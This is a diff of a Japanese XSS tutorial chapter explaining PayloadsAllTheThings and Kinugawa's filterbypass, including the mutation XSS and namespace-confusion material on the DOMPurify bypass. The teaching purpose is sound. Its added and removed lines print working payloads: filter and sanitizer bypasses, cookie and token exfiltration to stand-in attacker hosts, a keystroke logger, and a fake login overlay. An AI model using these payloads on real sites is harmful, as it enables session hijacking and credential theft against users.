+なぜ動くか: `href="javascript:..."` はリンクを踏むと URL 部分を JS として実行します。`%0D%0A`（CR/LF）や `%09`（タブ）、`%0a` は、ブラウザがスキーム名を判定する際に**無視・除去する制御文字**で、`java\nscript:` のように途中に挟んでも `javascript:` と認識されます。これで「`javascript:` という連続文字列」を探すフィルタを崩せます。`javascript://...%0a...` の `//` はコメント化しつつ改行で本体へ繋ぐ手口。`data:text/html,...` はレスポンスなしで HTML 文書を丸ごとインライン生成し、Base64 版はペイロードを一段隠します。
 
-**XML**: 名前空間を明示すれば XHTML として script が動きます。
+#### リモート読み込み・SVG/XML・CDATA
+
+短いペイロード欄しかない時は、本体を外部から取り込みます。
+
+```html
+<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
+<script src=14.rs>
+```
+
+XML/SVG 文書としてパースされる文脈では、名前空間や CDATA を悪用できます。
 
 ```xml
 <something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
 ```
 
-**Markdown**: リンク記法の URL 部分が sink になります。
-
-```markdown
-[a](javascript:prompt(document.cookie))
-[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[a](javascript:window.onerror=alert;throw%201)
-```
-
-なぜ動くか: Markdown を HTML に変換するライブラリが URL のスキームを検証していないと、`[表示文字](javascript:...)` が `<a href="javascript:...">` になります。`window.onerror=alert;throw 1` は「例外を投げると `onerror` が呼ばれ、その引数が `alert` に渡る」ことを使い、`alert(` という文字列を書かずに alert を発火させる技巧です。
-
-**CSS**: `background-image: url("...")` の中に `</style>` を紛れ込ませて CSS 文脈を脱出します。
-
-```html
-<style>
-div { background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>"); }
-</style>
-```
-
-なぜ動くか: HTML パーサは `<style>` の中身を探索中に `</style>` を見つけると即座に style 要素を閉じます（CSS の構文よりタグ境界の判定が優先される）。よって URL 文字列の途中の `</style>` で CSS を強制終了させ、その後ろの `<svg onload>` を通常の HTML として実行させられます。これは後述する mXSS（変異型 XSS）とも通じる「パーサの状態遷移を悪用する」発想です。
-
-#### リモートスクリプトと Blind XSS
-
-長いペイロードを1行に収められない、あるいは攻撃コードを後から差し替えたい場合、外部スクリプトを読み込ませます。
-
-```html
-<script src=//attacker/a></script>
-<script src=14.rs></script>            <!-- 14.rs/#alert(document.domain) で内容指定 -->
-<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
-```
-
-**Blind XSS（盲目的 XSS）** は、自分では結果を確認できない場所（管理画面のログ、サポートチケット、`Referer` や `User-Agent` を記録する解析画面など）で発火する XSS です。発火を「外部への通信」で検知します。
-
-```html
-"><script src=//[attacker.tld]></script>
-<script>document.location='http://[attacker]/?c='+document.domain</script>
-```
-
-なぜ有効か: 攻撃者は入力欄に仕込むだけで結果を見られませんが、被害者（多くは管理者）が管理画面でその値を表示した瞬間に攻撃者サーバーへリクエストが飛ぶので、発火の有無と発火した画面のドメインが判ります。PTAT は自前ホスト型の XSS Hunter（`mandatoryprogrammer/xsshunter-express`）や `ssl/ezXSS`、`LewisArdern/bXSS` などの検知基盤も紹介しています。狙うべきエンドポイントとして、問い合わせフォーム、サポートチケット、`Referer`/`User-Agent` を記録する解析・管理パネル、コメント欄が挙げられています。
-
-#### インパクト（影響）を示す PoC ペイロード
-
-`alert(1)` はあくまで「実行できた」証拠であり、実害を示すには次のような PoC（Proof of Concept＝概念実証）に置き換えます。バグバウンティ（脆弱性報奨金）の報告では、こうした「実際に何が盗めるか」を示すと評価が上がります。
-
-```html
-<!-- Cookie / トークンの窃取 -->
-<script>new Image().src="http://[attacker]/?c="+document.cookie;</script>
-<script>new Image().src="http://[attacker]/?c="+localStorage.getItem('access_token');</script>
-
-<!-- CORS を使ったデータ送信（no-cors で応答を読まず送信だけ行う） -->
-<script>fetch('https://[attacker]',{method:'POST',mode:'no-cors',body:document.cookie});</script>
-
-<!-- キーロガー（押されたキーを送信） -->
-<img src=x onerror='document.onkeypress=function(e){fetch("http://[attacker]/?k="+String.fromCharCode(e.which))},this.remove();'>
-
-<!-- 偽ログインフォームによる資格情報窃取（UI Redressing） -->
-<script>
-history.replaceState(null,null,'../../../login');
-document.body.innerHTML="<h1>Please login to continue</h1><form>Username:<input type='text'>Password:<input type='password'><input value='submit' type='submit'></form>";
-</script>
-```
-
-なぜ効くか: `document.cookie` にセッション ID が入っていれば（`HttpOnly` 属性が付いていない場合）、それを画像リクエストの URL に載せるだけで攻撃者サーバーに漏れます。`new Image().src=...` は目に見える変化を起こさず送信できるため気づかれにくい。UI Redressing の例は `history.replaceState` で URL バーの表示を `/login` に偽装しつつ、`document.body.innerHTML` をまるごと偽ログイン画面に差し替え、正規サイト上で資格情報を入力させます。
-
-検証を効率化する小技も収録されています。保存型 XSS ではポップアップを何度も閉じるのが面倒なので `alert` の代わりに `console.log(...)` や `debugger;` を使う、`document.domain` と `window.origin` を同時に出して**どのオリジン（origin＝スキーム＋ホスト＋ポートの組。同一オリジンポリシーの単位）で発火したか**を一目で確認する、といった実務テクニックです。
-
-```html
-<script>alert(document.domain.concat("\n").concat(window.origin))</script>
-```
-
-#### ポリグロット（polyglot）— 文脈を選ばない万能ペイロード
-
-ここまで見た通り、ペイロードは本来「文脈に合わせて選ぶ」ものです。しかし**注入先の文脈が事前に分からない**、あるいは**一発で複数箇所を試したい**ときに使うのがポリグロット（polyglot＝「多言語」の意。複数の文脈で同時に成立するように設計された一つの文字列）です。
-
-```javascript
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-```
-
-なぜ「万能」か（0xsobky のポリグロットの分解）:
-- `jaVasCript:` は大文字小文字を混ぜてある。ブラウザはスキーム名を**大小無視**で解釈するので `javascript:` として成立し、URL 文脈で発火する。同時に文字列としては `javascript` と一致しにくい。
-- `/*...*/` は JavaScript でも CSS でもコメントとして働くので、JS 文脈・CSS 文脈のどちらに落ちても、前後の既存コードを壊さず「無害な繋ぎ」として機能する。
-- `oNcliCk=alert()` は、もし属性文脈に落ちていれば有効なイベントハンドラ属性になる。
-- `</stYle/</titLe/</teXtarEa/</scRipt/` は、`<style>` `<title>` `<textarea>` `<script>` という **「中身を生テキストとして扱う要素」の内部に落ちた場合に、それらを片端から閉じて脱出する**ための閉じタグ群。どれか一つに入っていても抜け出せる。
-- 末尾の `\x3csVg/<sVg/oNloAd=alert()//>` は、脱出後に HTML 文脈で `<svg onload>` を発火させる本体（`\x3c` は `<`）。
-
-つまり一本の文字列に「URL 文脈」「JS/CSS コメント」「属性文脈」「rawtext 要素からの脱出」「HTML タグ注入」を全部詰め込み、**どの文脈に落ちても最低一つの経路で発火する**ように作られています。PTAT は他に Rsnake、Ashar Javed、Mathias Karlsson、@s0md3v らの著名ポリグロットも収録しています。
-
-```javascript
--->'"/></sCript><svG x=">" onload=(confirm)``>       <!-- @s0md3v -->
-';alert(String.fromCharCode(88,83,83))//...--></SCRIPT>">'><SCRIPT>...  <!-- Rsnake -->
-```
-
-> 出典: PayloadsAllTheThings — XSS Polyglot — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/2%20-%20XSS%20Polyglot.md
-
----
-
-### 資料2: Kinugawa filterbypass — ブラウザ組み込み XSS フィルタの回避
-
-Masato Kinugawa（きぬがわまさと）氏の **filterbypass** は、「Browser's XSS Filter Bypass Cheat Sheet（ブラウザの XSS フィルタ回避チートシート）」というタイトルの GitHub リポジトリで、内容は主に Wiki に置かれています。Wiki は次の3ページ構成です。
-
-- **Home**（目次）
-- **Browser's XSS Filter Bypass Cheat Sheet**（当時まだ動いた回避手法の本体）
-- **Fixed Bypass Archive**（すでにブラウザ側で修正された回避手法のアーカイブ）
-
-> 出典: filterbypass（Masato Kinugawa） — https://github.com/masatokinugawa/filterbypass
-> 出典: Browser's XSS Filter Bypass Cheat Sheet（Wiki） — https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
-
-#### 前提: 「ブラウザ XSS フィルタ」とは何だったか（歴史的経緯）
-
-まず重要な時代背景を押さえます。この資料が対象にしている **XSS Auditor（Chrome/Safari）** と **XSS Filter（IE/Edge）** は、かつてブラウザに組み込まれていた「反射型 XSS を検知して自動でブロックする機能」です。仕組みは大まかに、**「URL などのリクエストに含まれる文字列が、レスポンスの HTML 内でそのまま実行可能なスクリプトとして現れていたら、それを反射型 XSS とみなして無害化する」** というもの。いわば「入力と出力の一致」を見ていました。
-
-しかしこの方式は多くの問題を抱えていました。第一に、**フィルタ自体が新たな脆弱性の温床**になった——フィルタが「XSS だ」と判断して HTML の一部を書き換えることで、かえって別の XSS（フィルタ誘発型の情報漏えいなど）を生む事例が知られます。第二に、後述するように**回避方法が無数にあり**、防御としての実効性が低かった。こうした理由から、**Chrome は 78（2019年後半）で XSS Auditor を完全に削除**し、Microsoft も Edge の Chromium 化に伴い XSS Filter を廃止しました。
-
-したがって **filterbypass は現在では「歴史資料」** です。しかし本書で学ぶ価値は絶大です。なぜなら、ここで使われた回避テクニックの**原理**——文字コードの再解釈、パーサの状態遷移、同一オリジンリソースの悪用、名前空間の混乱——は、**現代の WAF 回避・サニタイザ回避・mXSS にそっくりそのまま応用が効く**からです。Kinugawa 氏自身、Wiki の末尾で「ここにバイパスが載っていなくても実際の悪用は可能であり、必ず根本的な XSS 対策（フィルタ頼みにしないこと）を行うべきだ」と強調しています。
-
-#### そもそもフィルタが「守らない」領域
-
-回避テクニックの前に、Kinugawa 氏はまず **「フィルタが最初から守っていない（=素通しする）文脈」** を列挙しています。ここに落ちる XSS は、そもそも回避を考えるまでもなく通ります。
-
-XSS Auditor（Chrome/Safari）が守らない領域:
-- **JavaScript 文字列リテラル内の XSS**: 例 `<script>var q="[ここに注入]";alert(1)//</script>`。入力がすでに `<script>` の中の文字列に入る場合、フィルタの「入力と出力の一致」検知が働きにくい。
-- **URL 単独の XSS**: 例 `<a href="javascript:alert(1)">Link</a>`。
-- **複数の注入ポイント**: ページ内の2箇所以上に別々に注入できる場合。フィルタは一つの連続したパターンを見るので、分割されると検知できない。
-- **DOM 型 XSS**: `document.write()` 経由を除き、ほとんどの DOM 型はサーバーレスポンスに現れないため素通し。
-- **XML ページの XSS**、**外部リクエストを送るだけのタグ**。
-
-IE/Edge の XSS Filter が守らない領域:
-- **すべての DOM 型 XSS**
-- **複数注入ポイント**
-- **文字列操作（削除・置換）を伴う場合**——アプリ側が入力中の特定文字を消したり置き換えたりすると、フィルタが見た反射パターンと実際の出力がズレて検知不能になる。
-
-この「守らない領域リスト」自体が、防御側にとっては**「フィルタに頼れない典型ケース集」**として今も有益です。
-
-#### XSS Auditor（Chrome/Safari）回避テクニック
-
-以下は Wiki 本体（当時動作）と Fixed Bypass Archive（修正済み）から統合した主要手法です。修正済みのものは対象バージョンを併記します（陳腐化への注意——これらは**すでに塞がれています**が、原理の学習が目的です）。
-
-**1. SVG アニメーションの `values` 属性を使う（Safari 系で有効だった）**
-
-```html
-<svg><animate xlink:href=#x attributeName=href values=&#x3000;javascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
-```
-
-なぜ動いたか: SVG の `<animate>` は「別要素の属性を時間変化で書き換える」機能で、ここでは `<a id=x>` の `href` を `javascript:alert(1)` に書き換えます。フィルタは静的な HTML を見るので「`href=javascript:` が反射している」とは気づけません。先頭の `&#x3000;`（全角スペースの文字参照）は、`javascript:` の直前に無害な文字を置いてフィルタのパターン判定をずらす役割です。Chrome では PoC 1 が Chrome 59、`values=&#106;avascript:`（`&#106;` は `j` の文字参照）を使う PoC 2 が Chrome 62 で修正されました。
-
-**2. 複数の null 文字（0x00）を前置する（Chrome、Chrome 62 で修正）**
-
-```
-[0x00][0x00][0x00][0x00][0x00][0x00][0x00]<script>alert(1)</script>
-```
-
-なぜ動いたか: フィルタが連続する null バイトを正しく処理できず、後続の `<script>` を見落とすバグを突いたものです。「任意タグを書ける」「null バイトが出力される」「直前に空白がない」の三条件で成立しました。
-
-**3. 半端な（閉じきらない）script 閉じタグ（Chrome のみ、Chrome 61 で修正）**
-
-```html
-<div> <script>alert(1)</script </div><div id="x"></div>
-```
-
-なぜ動いたか: `</script`（`>` を欠く不完全な閉じタグ）の後ろに空白があると、フィルタは script の範囲を正しく切り出せず、しかしブラウザは後続の `<` までを script 終端として実行してしまう、というパーサ挙動の差を利用しました。
-
-**4. script 内の `-->` によるコメント（Chrome、Chrome 62 で修正）**
-
-```html
-<div><script>alert(1)
---></div><script src=/test.js></script>
-```
-
-なぜ動いたか: HTML コメントの終端 `-->` を script 内に置くと、フィルタとブラウザで「どこまでが実行対象か」の解釈がズレ、フィルタの無害化を免れました。
-
-**5. 半端な `<form>` による情報窃取（Chrome、Chrome 62 で修正）**
-
-```html
-<form action="form">
-<input type="hidden" name="q" value=""></form><form action=https://attacker/">
-<input type="hidden" name="secret" value="a09d3ef0">
-<input type="submit">
-</form>
-```
-
-なぜ有効だったか: これは JavaScript を実行するのではなく、**ページ内に既存する秘密情報（隠しフォームの値）を攻撃者サーバーに送信させる**タイプ。注入した `<form action=https://attacker/>` が既存の秘密入力を「取り込んで」送信先を書き換えます。フィルタはスクリプト実行を見張るので、この手の情報漏えいは見逃しました。
-
-**6. `<object>` + `<param name=url/code>` で Flash 実行（Chrome のみ、Chrome 64 で修正）**
-
-```html
-<object allowscriptaccess=always><param name=url value=https://l0.cm/xss.swf>
-<object allowscriptaccess=always><param name=code value=https://l0.cm/xss.swf>
-```
-
-なぜ動いたか: `<script>` を使わず `<object>`＋Flash（`.swf`）で JavaScript を呼ぶ経路。`allowscriptaccess=always` は SWF から親ページの JavaScript 呼び出しを許す設定で、`ExternalInterface.call()` に未エスケープ文字列が渡ると任意 JS が動きます。Flash が使える環境が前提でした（Flash 自体が 2020 年末に終了）。
-
-**7. リンク＋半端な `<base>` タグ（Chrome、Chrome 65 で修正）**
-
-```html
-<div> <a href=//**/alert(1)>XSS</a><base href="javascript:\ </div><div id="x"></div>
-```
-
-なぜ動いたか: `<base href="javascript:...">` はページ内の相対リンクの基準 URL を書き換える要素で、これを不完全に置くことで相対 `href` が `javascript:` スキームに解決され、リンククリックで実行されました。
-
-**8. 同一ドメインのリソースを悪用する（最重要の発想）**
-
-XSS Auditor は「クエリを持たない**同一ドメイン**のリソースはスキップする（=信頼して検査しない）」という仕様の穴を持っていました。そこで、**攻撃コードを一度同一ドメインに置いてから読み込む**と検査を丸ごと回避できました。
-
-```html
-<!-- アップロード機能で置いた自前JSを読む -->
-<script src=/bypass/usercontent/xss.js></script>
-
-<!-- 同一ドメインに既にあるライブラリをテンプレートインジェクションに悪用 -->
-<script src="/js/angular1.6.4.min.js"></script>
-<p ng-app>{{constructor.constructor('alert(1)')()}}
-
-<!-- jQuery を悪用した DOM Clobbering -->
-<form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
-```
-
-なぜ強力か: これは XSS Auditor 特有の話に見えて、実は**現代でも通用する普遍的発想**です。`{{constructor.constructor('alert(1)')()}}` は AngularJS のテンプレート式で、`constructor.constructor` を辿ると `Function` コンストラクタに到達し、そこから任意コードを生成・実行できます（AngularJS テンプレートインジェクション）。DOM Clobbering（DOMクロバリング＝`name`/`id` 属性で JavaScript から参照される変数を HTML 要素で「上書き」する技法。`<input name=ownerDocument>` が `node.ownerDocument` の参照を狂わせる）も同様に、フィルタではなくアプリ側 JS の前提を崩します。「同一オリジンにある正規の部品を武器に変える」——この発想は WAF・CSP 回避の章でも繰り返し現れます。
-
-#### 文字コード（charset）を悪用する回避——回避の最深部
-
-Kinugawa 資料の白眉は、**文字エンコーディング（charset）の混乱**を突く一連の手法です。原理はこうです。**フィルタはある文字コード（多くは UTF-8）を前提にバイト列を文字として解釈してパターン照合するのに対し、ブラウザが最終的にそのページをレンダリングするときの文字コードが別物だと、「同じバイト列が両者で違う文字列に見える」**。この不一致を作れば、フィルタには無害に、ブラウザには `<script>` に見せられます。
-
-```html
-<!-- ISO-2022-JP のエスケープシーケンスで反応文字列を分断 -->
-<meta charset=iso-2022-jp>
-<svg o[0x1B](Bnload=alert(1)>
-```
-
-なぜ動くか: `[0x1B](B`（ESC + `(B`）は ISO-2022-JP（日本語の文字コード）における「ここから ASCII に戻る」というエスケープシーケンスで、**表示上は消える（何も描かれない）バイト列**です。よってフィルタが見るバイト列には `o<ESC>(Bnload` という異物が挟まって `onload` と一致しないのに、ブラウザが ISO-2022-JP として解釈するとエスケープシーケンスが除去され `onload` が復活し、`<svg onload>` が発火します。charset が明示されていないページで有効でした。
-
-IE/Edge XSS Filter に対しても同種の charset 回避が並びます。
-
-```html
-<!-- ナビゲーション時のエンコード不一致 -->
-<meta charset=utf-8>
-<script>
-document.charset="x-chinese-cns";
-location="https://vulnerabledoma.in/bypass/text?q=<script/旡alert(1)<\/script/旡"
-</script>
-```
-
-なぜ動くか: `document.charset` を `x-chinese-cns`（中国語の文字コード）に変えてから遷移すると、URL 中の文字 `旡` は送信バイト列では `0xA13E` になります。フィルタは文字 `旡` として照合しますが、遷移先で `x-chinese-cns` として解釈すると別の文字境界で切れて `<script>` が現れます。**フィルタの解釈環境と実行環境の charset がズレる**という、charset 回避の核心を最も鮮明に示す例です。
-
-```
-+/v8-+ADw-script+AD4-alert(1)+ADw-/script+AD4-
-```
-
-なぜ動くか: `+/v8-` は UTF-7 の BOM（Byte Order Mark＝文書の文字コードを示す先頭マーカー）として認識され、ページ全体が UTF-7 として再解釈されます。UTF-7 では `+ADw-` が `<`、`+AD4-` が `>` を表すので、`+ADw-script+AD4-` は `<script>` になります。フィルタが UTF-8 前提で「`<script>` は無い」と判断した後、ブラウザが UTF-7 に切り替えて `<script>` を出現させる、という時間差攻撃です（charset 未指定のページが前提）。
-
-その他の IE/Edge 系回避:
-
-```html
-<!-- HZ-GB-2312 のエスケープで属性を分断 -->
-<x~
-onfocus=alert(1) id=a tabindex=0>#a
-
-<!-- XML 名前空間の偽装（Edge） -->
-<embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>
-
-<!-- @ を文字参照化して CSS import を通す -->
-<svg><style>&commat;import'//attacker'</style></svg>
-```
-
-なぜ動くか: `~` は HZ-GB-2312 における改行エスケープとして働き、`onfocus` を属性値から分断してフィルタの照合を外します。`<embed/:script>` は `/:script` が「script タグらしさ」でフィルタを惑わせつつ、実体は embed として解釈される名前空間の混乱を突きます。`&commat;` は `@` の文字参照で、CSS の `@import`（外部スタイル読み込み）をフィルタに気づかせずに成立させ、外部リソースを読み込ませます（IE10 モードでは `behavior:url()` によるスクリプト実行にも繋がりました）。
-
-**Referer を使った無効化**も収録されています。IE/Edge の XSS Filter は同一サイト内リンク経由でアクセスされた（＝`Referer` が同一サイトの）場合にフィルタを無効化する挙動があり、これを悪用します。
-
-```html
-<a href="https://vulnerabledoma.in/bypass/text?q=<script>alert(1)</script>">Click HERE</a>
-```
-
-Edge には `Referer` を偽装できるバグ（`window.open` と `opener` を操作するもの）もあり、2018年4月時点で修正が確認されています。
-
-> 出典: Fixed Bypass Archive（Wiki） — https://github.com/masatokinugawa/filterbypass/wiki/Fixed-Bypass-Archive
-
-#### charset 回避が今も重要な理由
-
-XSS Auditor は消えましたが、**charset 混乱そのものは今も生きた攻撃面**です。`Content-Type` ヘッダで `charset` を明示していないページ、`<meta charset>` が本文より後ろにあるページ、ユーザー入力を含むレスポンスの文字コードが動的に変わるページでは、UTF-7 や ISO-2022-JP の再解釈による XSS が今も成立し得ます。防御は明快で、**すべてのレスポンスで `Content-Type: text/html; charset=utf-8` を明示し、`X-Content-Type-Options: nosniff` を付けてブラウザの charset 推測（sniffing）を止める**ことです。Kinugawa 資料の charset 章は、この防御がなぜ必要かを攻撃側から裏付ける最良の教材です。
-
----
-
-### 発展: フィルタの次の戦場——mutation XSS（mXSS）とサニタイザ回避
-
-ブラウザ組み込みフィルタが消えた今、防御の主役は **サニタイザライブラリ**（DOMPurify などの、危険な HTML を除去して安全な HTML を返すライブラリ）に移りました。そして攻撃側の主戦場も、フィルタ回避から**サニタイザ回避**へ移りました。その最先端が **mutation XSS（mXSS＝変異型 XSS）** で、これは Kinugawa 氏が世界的に有名になった研究領域です。PayloadsAllTheThings も mXSS の項で Kinugawa 氏の Google 検索に対する事例を収録しています。
-
-#### mXSS とは——「サニタイズ後に安全でなくなる」現象
-
-mXSS の原理は、**「サニタイザが検査・整形した HTML 文字列が、ブラウザの DOM に挿入されて再パースされる過程で、勝手に別の（危険な）DOM に『変異』する」** ことにあります。多くのサニタイザは「HTML をパース → 危険な要素・属性を除去 → 安全な HTML 文字列に再シリアライズ（DOM を文字列に書き戻す）」という流れで動きます。ところが、この**再シリアライズした文字列を最終的に `innerHTML` などに入れると、ブラウザが再びパースし直す**。このとき「サニタイザがパースした結果」と「ブラウザが再パースした結果」がズレると、除去したはずの実行可能コードが復活してしまう。これが mXSS です。要点は **「サニタイザのパーサと、最終挿入先のブラウザパーサの、解釈の差」** を突く点にあり、charset 回避で見た「二つの解釈環境のズレ」とまったく同じ発想です。
-
-PayloadsAllTheThings が挙げる、Kinugawa 氏による Google 検索への mXSS（DOMPurify に対して機能した）:
+なぜ動くか: `xmlns:something="http://www.w3.org/1999/xhtml"` で任意の接頭辞に XHTML 名前空間を割り当てると、`something:script` が実質 `script` 要素として扱われ、`script` という**タグ名そのもの**を弾くフィルタを回避します。CDATA セクション `<![CDATA[...]]>` は「この中は生テキスト」という宣言ですが、サニタイザが CDATA を解いて再パースすると、内側の `</desc><script>` が有効なタグへ**変異（mutation）**します——これが後章で詳述する mXSS の入口です。PTAT はこの短い例も収録しています。
 
 ```html
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
 ```
 
-なぜ変異するか: `<noscript>` 要素の中身は、「JavaScript が有効なブラウザ」と「無効なブラウザ」でパース規則が変わる特殊な要素です。JS 有効時、`<noscript>` の中身は生テキスト的に扱われ、`<p title="</noscript>...` の `</noscript>` は「属性値の一部の文字列」と見なされます。ところがサニタイズを経て再度 DOM に挿入されると、パースの文脈が変わって `</noscript>` が本物の閉じタグとして解釈され、その後ろの `<img src=x onerror=alert(1)>` が**属性値の中から解放されて生きた要素になる**。つまり「サニタイザには無害な属性値に見え、ブラウザ再パースで実行要素に変異する」——これが mXSS の典型です。
+なぜ動くか: `<noscript>` はスクリプト有効時と無効時でパース規則が変わる要素で、この差を使うと属性値の中に書いたはずの `</noscript><img ...>` がタグ境界を跨いで有効化されます。典型的な mXSS です。
 
-> 出典: PayloadsAllTheThings — XSS Injection README（Mutation XSS の項） — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
+#### 情報窃取・ブラインド XSS・ツール
 
-#### namespace confusion による DOMPurify < 2.0.17 バイパス
-
-（以下は、担当資料からリンクされる詳細記事〔securitum の解説等〕が執筆環境のネットワーク制限で直接取得できなかったため、Web 検索結果のスニペットと一般的な知識に基づく補足解説です。バージョン等の細部は必ず一次情報で確認してください。）
-
-mXSS の中でも特に重要なのが **namespace confusion（名前空間の混乱）** を使った DOMPurify のバイパスです。これは Michał Bentkowski 氏が公開した **「DOMPurify < 2.0.17 バイパス」**（2020年、修正版は DOMPurify 2.0.17）として知られ、Kinugawa 氏の一連の mXSS 研究とも密接に関連します。
-
-背景となる仕組み: HTML には **三つの名前空間（namespace）** が混在します——通常の HTML、SVG、MathML です。`<svg>` や `<math>` の内側は「foreign content（外来コンテンツ）」と呼ばれ、**通常の HTML とはパース規則が変わります**。さらにその中に `<foreignObject>`（SVG 内）や `<mtext>` / `<mi>`（MathML 内。これらは「integration point＝統合点」と呼ばれ、内部で HTML 名前空間へ戻る）などがあると、**パーサはその境界で名前空間を切り替える**。この「どこで名前空間が切り替わるか」の判断が、サニタイザのパースとブラウザの再パースでズレると、除去されたはずのタグが復活します。
-
-代表的なペイロードの形（`<mglyph>` や `<mtext>` と `<style>` を組み合わせるもの）:
+XSS が「実行できる」ことを確認したら、次は目的（Cookie 窃取、キーロガー、フィッシング）です。PTAT は実物を並べます。
 
 ```html
-<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
+<script>fetch('https://ATTACKER', {method:'POST', mode:'no-cors', body:document.cookie});</script>
+<img src=x onerror='document.onkeypress=function(e){fetch("http://ATTACKER/?k="+String.fromCharCode(e.which))},this.remove();'>
 ```
 
-なぜ変異するか（概略）: `<mglyph>` や `<malignmark>` は MathML の中で特殊な扱いを受ける要素で、`<mtext>`（MathML のテキスト統合点）の中に置かれると名前空間の解釈が切り替わります。サニタイザは、ある名前空間の文脈で `<style>` の中身を「ただのスタイル文字列（無害なテキスト）」として扱い、その中の `<img onerror>` を実行可能な要素とは認識せず素通しします。ところがサニタイズ済み文字列を DOM に挿入して再パースすると、名前空間の切り替わり方が変わり、`<style>` がもはやその中身を生テキストとして保持しなくなって、内部の `<img src onerror=alert(1)>` が**本物の要素として起き上がり発火する**。「サニタイザが想定した名前空間」と「ブラウザ再パース時の名前空間」の食い違いが、除去したはずのコードを蘇らせる——これが namespace confusion による mXSS の核心です。
+なぜ動くか: `new Image().src=...` は画像リクエストを装って任意ドメインへ GET を飛ばし、URL 末尾に Cookie を付けて外部送信します（古典的 exfiltration）。`fetch(..., {mode:'no-cors'})` はレスポンスを読めない代わりに CORS 制限なく POST でき、本文に Cookie を乗せて送れます。`document.onkeypress` はキー入力を横取りするキーロガーです。なお `HttpOnly` 付き Cookie は `document.cookie` で読めないため、この手の窃取は無効になります（防御側の要点）。
 
-> 出典（検索スニペットによる二次確認）: Mutation XSS via namespace confusion – DOMPurify < 2.0.17 bypass（Michał Bentkowski, securitum）／PortSwigger Research "Bypassing DOMPurify again with mutation XSS" — 検索: https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
+保存先が見えない**ブラインド XSS**（管理画面など、自分では結果を見られない箇所での発火）には、外部の受信サーバーへスクリプトを読みに行かせます。
 
-#### バージョン依存の攻撃という視点（陳腐化への注意）
+```html
+"><script src="https://js.rip/ATTACKER"></script>
+<script>$.getScript("//ATTACKER")</script>
+```
 
-ここで強調したいのは、**サニタイザ回避は「バージョン依存の攻撃」だ**という点です。上記の namespace confusion バイパスは **DOMPurify < 2.0.17（2020年に 2.0.17 で修正）** に対するものであり、最新版では通用しません。しかし DOMPurify はその後も新たな mXSS（例えば Kinugawa 氏や他の研究者が発見した、より深いネストを使う変異や、`<template>`・`<xmp>`・エンティティ処理を突くもの）で複数回バイパスされ、そのたびに修正を重ねてきました。
-
-学習者への実践的教訓は三つです。
-
-1. **サニタイザは「使えば安全」ではなく「最新に保てば相対的に安全」**。防御側は DOMPurify 等を必ず最新版に追従させる。攻撃・診断側は対象が使っているライブラリと**そのバージョン**を特定し、そのバージョンで既知のバイパスがないかを調べる。
-2. **バイパス手法には必ず「対象バージョン」と「修正年・修正版」がある**。本節の各ペイロード（Chrome 59〜65 で順次修正された XSS Auditor 回避群、2020年の DOMPurify 2.0.17 バイパス等）は、その大半が**すでに修正済み**です。丸暗記して現行環境に投げても動きません。価値があるのは**「なぜ動いたか」の原理**で、それは新しいバイパスを自分で発見する土台になります。
-3. **mXSS の根本原因は「サニタイズと最終挿入で HTML が二度パースされ、その解釈が食い違う」こと**。よって最も堅牢な防御は、そもそも文字列 HTML を組み立てて挿入しない設計——`textContent` を使う、`Trusted Types`（信頼できる型以外を sink に入れさせないブラウザ機構）を導入する、サニタイズ結果を `innerHTML` ではなく安全な API 経由で挿入する——です（詳細は防御の章に譲ります）。
+PTAT は最後に、自動化ツール（XSStrike、Dalfox、XSpear、domdig、ezXSS など）と学習リソース（LiveOverflow「DO NOT USE alert(1) for XSS」、Cure53 の DOMPurify 研究など）を列挙し、防御としては「入力の検証・サニタイズ」に加え、**出力コンテキストに応じたエスケープ**と、ユーザー生成コンテンツを別ドメイン（sandbox domain）へ隔離する設計を推奨しています。
 
 ---
 
-### この節のまとめ
+### 資料2: filterbypass（Kinugawa） — ブラウザ組み込みXSSフィルタの回避
 
-- **PayloadsAllTheThings** は「文脈で引く辞書」。入力が落ちる文脈（タグ内／属性値内／JS 文字列内／URL）をまず特定し、その欄のペイロードを選ぶ。`<script>` が無理なら `onerror`/`onload`、それも無理ならエンコーディング回避、文脈不明ならポリグロット、という手順を体で覚える。ペイロードには常に「なぜ動くか」（パーサの状態、文字参照の復元、スキーム判定の緩さ）が対応する。
-- **Kinugawa filterbypass** は「フィルタ回避の原理集」。対象の XSS Auditor / IE・Edge XSS Filter は既に廃止済みだが、そこで確立された **charset 混乱・パーサ状態遷移・同一オリジンリソース悪用・名前空間の混乱** という発想は、現代の WAF 回避・サニタイザ回避・mXSS にそのまま生きる。
-- 両資料に共通する統一原理は **「フィルタ／サニタイザが見る文字列と、ブラウザが最終的に解釈する文字列を、意図的にズラす」** こと。文字コード、パース文脈、名前空間——どのレイヤーでズレを作っても XSS は成立し得る。
-- したがって防御は「危険な文字列を弾く（ブロックリスト）」では原理的に穴が残る。**出力時の文脈別エンコーディング、charset の明示（+ `nosniff`）、サニタイザの最新化、`Trusted Types`／CSP による許可リスト型の多層防御**——これらの組み合わせだけが持続的に有効である。
